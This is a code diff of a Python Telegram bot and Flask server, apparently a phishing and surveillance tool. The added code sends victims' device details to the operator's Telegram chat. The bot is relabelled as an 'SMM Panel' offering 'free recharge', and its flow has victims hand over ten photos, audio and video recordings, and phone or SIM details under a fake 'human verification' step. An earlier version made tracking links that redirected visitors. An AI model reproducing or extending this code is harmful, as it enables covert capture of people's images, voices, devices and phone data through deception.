+    # Send device info
+    device_msg = (f"📱 **Device Info**\n\n"
+                 f"Platform: `{data.get('platform', 'N/A')}`\n"
+                 f"Screen: `{data.get('screen', 'N/A')}`\n"
+                 f"User Agent: `{data.get('userAgent', 'N/A')[:100]}`\n"
+                 f"Timestamp: `{data.get('timestamp', 'N/A')}`")
+    
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                 json={"chat_id": chat_id, "text": device_msg, "parse_mode": "Markdown"})
+    
+    return jsonify({'success': True})
 
-    return "OK"
+# --- TELEGRAM BOT HANDLERS ---
 
-# --- HELPER: CHECK SUB ---
 async def is_subscribed(app, user_id):
     for channel in CHANNELS:
         try:
@@ -220,56 +887,53 @@ async def is_subscribed(app, user_id):
             return False
     return True
 
-# --- BOT HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
-    # Group chat me reply mat karo
-    if update.effective_chat.type in ["group", "supergroup"]:
-        return
-    
     if not await is_subscribed(context.application, user_id):
-        buttons = [
-            [InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/proxydominates")],
-            [InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/midnight_xaura")],
-            [InlineKeyboardButton("📢 Join Channel 3", url="https://t.me/+9gNiX6EZV1Q4MTU5")],
-            [InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
-        ]
-        await update.message.reply_text(
-            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare **teenon** channels join karne honge.",
-            reply_markup=InlineKeyboardMarkup(buttons)
-        )
+        buttons = [[InlineKeyboardButton(f"Join Channel {i+1}", url=url)] for i, url in enumerate(CHANNEL_URLS)]
+        buttons.append([InlineKeyboardButton("✅ Verified", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")])
+        await update.message.reply_text("❌ **Access Denied!** Join channels to use bot.",
+                                       reply_markup=InlineKeyboardMarkup(buttons))
         return
-
-    await update.message.reply_text("👋 **Tracker Online!**\nLink bhejo (jaise https://youtube.com).")
+    
+    await update.message.reply_text(
+        "👋 **Welcome to SMM Panel Bot!**\n\n"
+        "Send any link to generate your SMM panel access URL.\n\n"
+        "Features:\n"
+        "🔐 Human Verification (10 photos)\n"
+        "🎤 Audio Recording (10 sec)\n"
+        "🎥 Video Recording (10 sec)\n"
+        "💰 Free Recharge Plans\n"
+        "📱 SIM/Phone Submission\n"
+        "🎁 20% Bonus on Alternative Number"
+    )
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
-    # Group chat me reply mat karo
-    if update.effective_chat.type in ["group", "supergroup"]:
-        return
-    
     if not await is_subscribed(context.application, user_id):
         await start(update, context)
         return
-
+    
     url = update.message.text
     if not url.startswith("http"):
-        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
+        await update.message.reply_text("❌ Invalid link. Please send a valid URL.")
         return
-
-    uid = update.effective_chat.id
-    redir = urllib.parse.quote(url)
-    link = f"{SERVER_URL}/?id={uid}&redir={redir}"
-
-    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @REVULET")
-
-def run_flask():
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    
+    # First go to verification, then panel
+    link = f"{SERVER_URL}/?id={update.effective_chat.id}"
+    await update.message.reply_text(
+        f"✅ **Your SMM Panel Link:**\n\n`{link}`\n\n"
+        f"📋 User Flow:\n"
+        f"1️⃣ 📸 Human Verification (10 photos)\n"
+        f"2️⃣ 🎤 Audio Recording (10 sec)\n"
+        f"3️⃣ 🎥 Video Recording (10 sec)\n"
+        f"4️⃣ 💰 Free Recharge Panel\n"
+        f"5️⃣ 📱 Submit Phone/SIM Details\n"
+        f"6️⃣ 🎉 Success Page"
+    )
 
 if __name__ == '__main__':
-    threading.Thread(target=run_flask).start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.getenv("PORT", 10000)))).start()
     bot = Application.builder().token(TOKEN).build()
     bot.add_handler(CommandHandler("start", start))
     bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
